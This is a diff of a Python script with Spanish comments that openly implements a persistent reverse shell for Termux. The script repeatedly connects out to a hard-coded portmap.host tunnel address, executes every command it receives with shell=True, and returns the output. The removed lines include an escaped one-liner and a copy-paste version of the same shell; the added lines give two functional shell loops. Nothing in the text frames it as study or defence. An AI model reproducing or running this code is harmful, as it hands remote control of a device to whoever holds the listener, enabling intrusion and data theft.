@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-REVERSE SHELL ULTRA ESTABLE - NO SE CIERRA NUNCA
+REVERSE SHELL SIN ERRORES DE ASCII
 """
 
 import socket
@@ -8,112 +8,81 @@ import subprocess
 import os
 import sys
 import time
-import platform
 
 # ===== CONFIGURACIÓN =====
 HOST = "Astrazam-37147.portmap.host"
 PORT = 37147
 # =========================
 
-def ultra_stable_shell():
-    """Shell ultra estable que no se cierra nunca"""
+def clean_shell():
+    """Shell limpia sin caracteres problemáticos"""
     print(f"[+] Conectando a {HOST}:{PORT}")
-    print("[+] Shell ultra estable activada - No se cerrará")
     
     while True:
         try:
             # Crear conexión
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = socket.socket()
             s.settimeout(10)
             s.connect((HOST, PORT))
-            s.settimeout(3600)  # 1 hora de timeout para recv
+            s.settimeout(None)
             
-            print(f"[+] Conexión #{time.strftime('%H:%M:%S')}")
+            print("[+] Conectado - Shell activa")
             
-            # Enviar banner
-            banner = f"""
-{'='*60}
-🚀 REVERSE SHELL ULTRA ESTABLE - TERMUX
-{'='*60}
-Host: {platform.node()}
-User: {os.getenv('USER', 'termux')}
-Hora: {time.strftime('%H:%M:%S')}
-Directorio: {os.getcwd()}
-{'='*60}
-[+] COMANDOS DISPONIBLES:
-    • cd, ls, pwd, cat, nano, mv, cp, rm
-    • cd ~/storage       # Almacenamiento interno
-    • cd ~/storage/shared # Archivos compartidos
-    • ls -la            # Ver con detalles
-    • termux-setup-storage # Configurar almacenamiento
-{'='*60}
-[+] IMPORTANTE: Esta shell NO se cerrará automáticamente
-    Solo se cerrará si escribes 'exit' o 'quit'
-{'='*60}
-
-termux@shell:~$ """
-            s.sendall(banner.encode())
+            # Enviar mensaje inicial SIN ACENTOS
+            s.sendall(b"\n[+] Shell lista - Escribe comandos:\n")
+            s.sendall(b"$ ")
             
-            # Variable para el directorio actual
-            current_dir = os.getcwd()
+            # Directorio actual
+            cwd = os.getcwd()
             
-            # Bucle principal de comandos
+            # Bucle principal
             while True:
                 try:
                     # Recibir comando
-                    s.sendall(b"\ntermux@shell:~$ ")
-                    data = s.recv(4096).decode().strip()
+                    data = s.recv(4096).decode('utf-8', errors='ignore').strip()
                     
                     if not data:
-                        # Conexión cerrada por el otro lado
-                        print("[-] Conexión cerrada remotamente")
                         break
                     
                     # Comandos especiales
                     if data.lower() in ["exit", "quit"]:
-                        s.sendall(b"\n[+] Saliendo de la shell...\n")
+                        s.sendall(b"\n[!] Saliendo...\n")
                         s.close()
                         return
                     
-                    # Manejar CD correctamente
+                    # Manejar CD
                     if data.startswith("cd "):
                         path = data[3:].strip()
                         
-                        # Corregir el error común
+                        # Corregir posibles errores
                         if path.startswith("--/"):
                             path = path.replace("--/", "~/")
-                        
-                        # Expandir ~ a home
                         if path.startswith("~/"):
                             home = os.path.expanduser("~")
                             path = path.replace("~", home, 1)
-                        elif path == "~":
-                            path = os.path.expanduser("~")
                         
                         try:
                             os.chdir(path)
-                            current_dir = os.getcwd()
-                            s.sendall(f"[+] Directorio cambiado a: {current_dir}\n".encode())
-                        except FileNotFoundError:
-                            s.sendall(f"[-] Error: Directorio no encontrado: {path}\n".encode())
-                        except PermissionError:
-                            s.sendall(f"[-] Error: Permiso denegado para: {path}\n".encode())
+                            cwd = os.getcwd()
+                            s.sendall(f"[+] Directorio: {cwd}\n".encode())
                         except Exception as e:
                             s.sendall(f"[-] Error: {str(e)}\n".encode())
+                        
+                        s.sendall(b"$ ")
                         continue
                     
                     # Comando PWD
                     if data == "pwd":
-                        s.sendall(f"{current_dir}\n".encode())
+                        s.sendall(f"{cwd}\n".encode())
+                        s.sendall(b"$ ")
                         continue
                     
-                    # Para cualquier otro comando
+                    # Ejecutar cualquier otro comando
                     try:
-                        # Ejecutar con timeout
                         proc = subprocess.run(
                             data,
                             shell=True,
-                            cwd=current_dir,
+                            cwd=cwd,
                             capture_output=True,
                             text=True,
                             timeout=30
@@ -126,114 +95,104 @@ termux@shell:~$ """
                             s.sendall(proc.stderr.encode())
                             
                     except subprocess.TimeoutExpired:
-                        s.sendall(b"\n[!] Timeout: Comando tardando más de 30 segundos\n")
+                        s.sendall(b"\n[!] Timeout: Comando muy largo\n")
                     except Exception as e:
-                        s.sendall(f"[-] Error ejecutando comando: {str(e)}\n".encode())
+                        s.sendall(f"[-] Error: {str(e)}\n".encode())
+                    
+                    # Nuevo prompt
+                    s.sendall(b"\n$ ")
                     
                 except socket.timeout:
-                    # Enviar ping para mantener conexión activa
-                    s.sendall(b"\n[ping] Conexion activa - Esperando comandos...\n")
+                    # Mantener conexión viva
+                    s.sendall(b"\n[ping] Conexion activa\n$ ")
                     continue
                 except Exception as e:
-                    s.sendall(f"\n[!] Error interno: {str(e)}\n".encode())
                     break
             
-            # Cerrar socket y reconectar
+            # Cerrar y reconectar
             s.close()
-            print(f"[-] Reconectando en 3 segundos...")
+            print("[-] Reconectando...")
             time.sleep(3)
             
         except KeyboardInterrupt:
-            print("\n[+] Interrumpido por usuario")
+            print("\n[!] Interrumpido")
             sys.exit(0)
-        except ConnectionRefusedError:
-            print("[-] Conexión rechazada - Verifica portmap.io")
-            time.sleep(5)
-        except socket.timeout:
-            print("[-] Timeout de conexión - Reintentando...")
-            time.sleep(3)
         except Exception as e:
-            print(f"[-] Error: {e} - Reconectando en 5s...")
+            print(f"[-] Error: {e}")
             time.sleep(5)
 
-# ===== ONE-LINER ULTRA SIMPLE =====
-ONE_LINER = '''python3 -c "import socket,subprocess,os,time;h='Astrazam-37147.portmap.host';p=37147;print('[*] Conectando a portmap.io');exec('while 1: try: s=__import__(\\'socket\\').socket();s.connect((h,p));s.send(b\\\\\\\\\\\\\\\"\\\\\\\\n[+] Shell ultra estable\\\\\\\\n$ \\\\\\\\\\\\\\\");cwd=os.getcwd();exec(\\'while 1: try: s.send(b\\\\\\\\\\\\\\\"$ \\\\\\\\\\\\\\\");d=s.recv(4096).decode();exec(\\\\\\\"if not d:break\\\\\\\");exec(\\\\\\\"if d.strip() in [\\\\\\\\\\\\\\\'exit\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'quit\\\\\\\\\\\\\\\']:s.send(b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n[+] Saliendo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\");break\\\\\\\");exec(\\\\\\\"if d.startswith(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'cd \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'):p=d[3:];exec(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"try:os.chdir(p);cwd=os.getcwd();s.send(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[+] cd: {cwd}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".encode())except Exception as e:s.send(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[-] cd error: {str(e)}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".encode())\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\");continue\\\\\\\");exec(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"try:r=__import__(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'subprocess\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\').run(d,shell=True,cwd=cwd,capture_output=True,timeout=30);s.send(r.stdout);s.send(r.stderr)except Exception as e:s.send(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[-] Error: {str(e)}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".encode())\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\");\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\") except: s.send(b\\\\\\\\\\\\\\\"[ping] alive\\\\\\\\\\\\\\\");continue\\\');s.close() except Exception as e: print(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[-] Error: {e}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"); time.sleep(3)')"'''
+# ===== VERSIÓN EXTRA SEGURA =====
+def ultra_safe_shell():
+    """Versión ultra segura sin caracteres especiales"""
+    print("[+] Shell ultra segura iniciada")
+    
+    while True:
+        try:
+            s = socket.socket()
+            s.connect((HOST, PORT))
+            s.send(b"\n[+] Connected\n$ ")
+            
+            while True:
+                try:
+                    s.send(b"$ ")
+                    cmd = s.recv(4096).decode().strip()
+                    
+                    if not cmd:
+                        break
+                    
+                    # Comandos básicos
+                    if cmd == "exit":
+                        break
+                    
+                    # CD command
+                    if cmd.startswith("cd "):
+                        try:
+                            os.chdir(cmd[3:])
+                            s.send(b"[+] OK\n")
+                        except:
+                            s.send(b"[-] Error\n")
+                        continue
+                    
+                    # Execute command
+                    try:
+                        result = subprocess.run(
+                            cmd,
+                            shell=True,
+                            capture_output=True,
+                            timeout=20
+                        )
+                        s.send(result.stdout)
+                        s.send(result.stderr)
+                    except:
+                        s.send(b"[-] Command error\n")
+                        
+                except:
+                    s.send(b"[ping]\n")
+                    continue
+                    
+            s.close()
+            time.sleep(3)
+        except:
+            time.sleep(5)
+            continue
 
 if __name__ == "__main__":
-    # Mostrar opciones
-    print(f"""
-{'='*60}
-🔥 REVERSE SHELL ULTRA ESTABLE
-{'='*60}
-1. Ejecutar shell completa
-2. Ver one-liner para copiar
-3. Versión simple (recomendada)
-{'='*60}
-""")
+    # Menú simple
+    print("\n" + "="*50)
+    print("REVERSE SHELL - SIN ERRORES ASCII")
+    print("="*50)
+    print("1. Shell completa")
+    print("2. Shell ultra simple")
+    print("="*50)
     
     try:
-        opcion = input("Selecciona (1/2/3): ").strip()
+        choice = input("Opcion: ").strip()
         
-        if opcion == "1":
-            ultra_stable_shell()
-        elif opcion == "2":
-            print("\n📋 ONE-LINER ULTRA ESTABLE:")
-            print("-" * 60)
-            print(ONE_LINER)
-            print("-" * 60)
-            print("\nCopia y pega en Termux")
-        elif opcion == "3":
-            # Versión simple y robusta
-            simple_script = '''python3 -c "
-import socket,subprocess,os,time
-host='Astrazam-37147.portmap.host'
-port=37147
-print('[+] Conectando...')
-while True:
-    try:
-        s=socket.socket()
-        s.connect((host,port))
-        s.send(b'\\\\n[+] Shell lista - Escribe comandos:\\\\n')
-        cwd=os.getcwd()
-        while True:
-            try:
-                s.send(b'$ ')
-                cmd=s.recv(4096).decode().strip()
-                if not cmd: break
-                if cmd in ['exit','quit']: break
-                if cmd.startswith('cd '):
-                    path=cmd[3:]
-                    try:
-                        os.chdir(path)
-                        cwd=os.getcwd()
-                        s.send(f'[+] cd: {cwd}\\\\n'.encode())
-                    except Exception as e:
-                        s.send(f'[-] cd error: {str(e)}\\\\n'.encode())
-                    continue
-                try:
-                    r=subprocess.run(cmd,shell=True,cwd=cwd,capture_output=True,timeout=30)
-                    if r.stdout: s.send(r.stdout)
-                    if r.stderr: s.send(r.stderr)
-                except Exception as e:
-                    s.send(f'[-] Error: {str(e)}\\\\n'.encode())
-            except:
-                s.send(b'[ping] alive\\\\n')
-                continue
-        s.close()
-        time.sleep(3)
-    except:
-        time.sleep(5)
-        continue
-"'''
-            print("\n📋 VERSIÓN SIMPLE RECOMENDADA:")
-            print("-" * 60)
-            print(simple_script)
-            print("-" * 60)
-            print("\nCopia y pega en Termux")
+        if choice == "1":
+            clean_shell()
         else:
-            print("[!] Opción inválida, ejecutando shell completa...")
-            ultra_stable_shell()
+            ultra_safe_shell()
             
     except KeyboardInterrupt:
-        print("\n[+] Saliendo...")
+        print("\n[+] Saliendo")
         sys.exit(0)
